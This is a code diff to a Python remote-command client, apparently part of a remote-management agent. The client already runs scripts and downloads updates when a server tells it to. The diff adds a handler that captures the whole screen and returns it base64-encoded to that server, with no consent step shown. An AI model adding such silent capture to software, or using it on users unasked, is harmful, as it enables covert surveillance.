@@ -78,6 +78,7 @@ class ClientCallback:
             "restart": self._handle_restart,
             "execute_script": self._handle_execute_script,
             "download_update": self._handle_download_update,
+            "screenshot": self._handle_screenshot,
         }
 
     async def _handle_ping(self, params: dict) -> dict:
@@ -189,6 +190,69 @@ class ClientCallback:
                     return {"status": "error", "message": f"Download failed: {response.status_code}"}
         except Exception as e:
             return {"status": "error", "message": str(e)}
+
+    async def _handle_screenshot(self, params: dict) -> dict:
+        """Handle screenshot capture for troubleshooting"""
+        try:
+            import base64
+            import io
+
+            # Try PIL/Pillow first (works on most systems)
+            try:
+                from PIL import ImageGrab
+
+                # Capture screenshot
+                screenshot = ImageGrab.grab()
+
+                # Convert to bytes
+                img_buffer = io.BytesIO()
+                screenshot.save(img_buffer, format='PNG', optimize=True)
+                img_bytes = img_buffer.getvalue()
+
+                # Encode as base64
+                img_base64 = base64.b64encode(img_bytes).decode('utf-8')
+
+                return {
+                    "status": "success",
+                    "screenshot": img_base64,
+                    "format": "png",
+                    "size": len(img_bytes),
+                    "dimensions": f"{screenshot.width}x{screenshot.height}"
+                }
+
+            except ImportError:
+                # Fallback to mss (faster, cross-platform)
+                try:
+                    import mss
+                    import mss.tools
+
+                    with mss.mss() as sct:
+                        # Capture primary monitor
+                        monitor = sct.monitors[1]
+                        screenshot = sct.grab(monitor)
+
+                        # Convert to PNG bytes
+                        img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
+
+                        # Encode as base64
+                        img_base64 = base64.b64encode(img_bytes).decode('utf-8')
+
+                        return {
+                            "status": "success",
+                            "screenshot": img_base64,
+                            "format": "png",
+                            "size": len(img_bytes),
+                            "dimensions": f"{screenshot.width}x{screenshot.height}"
+                        }
+
+                except ImportError:
+                    return {
+                        "status": "error",
+                        "message": "Screenshot libraries not available. Install: pip install pillow mss"
+                    }
+
+        except Exception as e:
+            return {"status": "error", "message": f"Screenshot failed: {str(e)}"}
 
     async def send_heartbeat(self):
         """Send heartbeat to admin server and check for commands"""
